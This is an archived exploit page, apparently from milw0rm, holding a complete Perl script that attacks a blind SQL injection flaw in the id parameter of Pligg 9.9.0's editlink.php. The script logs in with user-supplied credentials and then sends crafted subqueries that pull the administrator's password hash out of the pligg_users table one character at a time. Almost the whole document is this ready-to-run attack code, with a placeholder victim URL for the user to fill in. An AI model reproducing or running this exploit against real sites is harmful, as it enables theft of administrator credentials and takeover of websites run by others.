<html><head><title>Pligg 9.9.0 (editlink.php id) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

######################################################################################
# Pligg v9.9 Blind SQL Injection
#####################################
#
# vuln:
#   editlink.php? SQL Injection:
#   (magic_quotes off)
#
#   This exploit is possible because the $id variable in check_url.php is taken
#   from the url and then used in an SQL query without being sanitized.
#
#####################################
#
#  by Rohit Bansal [rohitisback@gmail.com] www.Schap.Org
#  original advisory: http://www.milw0rm.com/exploits/5406 (Guido Landi)
#
######################################################################################


 use LWP::UserAgent;
 use HTTP::Request;
 use HTTP::Cookies;

@chars = split(//, &quot;0123456789abcdef&quot;);
                                                         ####### CHANGE THESE ########
my $url = &quot;http://victim.compath-to-pligg/&quot;;                      # site and path to pligg
my $mylink = 1;                                             # link the user posted
my $username = &quot;user&quot;;                                      # username to log in with
my $password = &quot;password&quot;;                                  # password to log in with

my $hash;
my $content;

print &quot;\nPligg CMS v9.9 editlink.php Blind SQL Injection\n\n&quot;;

print &quot;+ Logging in to $url\n&quot;;
print &quot;+ Extracting hash...\n&quot;;

$b = LWP::UserAgent-&gt;new() or die;
$b-&gt;agent('Mozilla');
$cj = HTTP::Cookies-&gt;new;
$b-&gt;cookie_jar($cj);

$req = HTTP::Request-&gt;new(POST=&gt;$url.&quot;login.php&quot;);
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;content(&quot;username=$username&amp;password=$password&amp;processlogin=1&quot;);
$res = $b-&gt;request($req);
$cj-&gt;extract_cookies($res);

print &quot;User god hash: &quot;;

for($i = 0;$i &lt; 50; $i++)
{
   for($j = 0; $j &lt; 16; $j++)
   {
       $craft  = &quot;editlink.php?id=(select(if((select%20substr(user_pass,$i,1)%20from%20pligg_users%20where%20&quot;;
       $craft .= &quot;user_id=1)=\'&quot; . $chars[$j] . &quot;\',&quot; . $mylink . &quot;,-999)))&quot;;
       $req = HTTP::Request-&gt;new(GET=&gt;$url.$craft);
       $req-&gt;content_type('application/x-www-form-urlencoded');
       $res = $b-&gt;request($req);

       $content = $res-&gt;content;     
     
      if(!($content =~ /not your link/i))
      {
     print $chars[$j];
         $hash .= $chars[$j];
      }
   }
}

print &quot;\n&quot;;

# milw0rm.com [2009-04-20]</pre></html>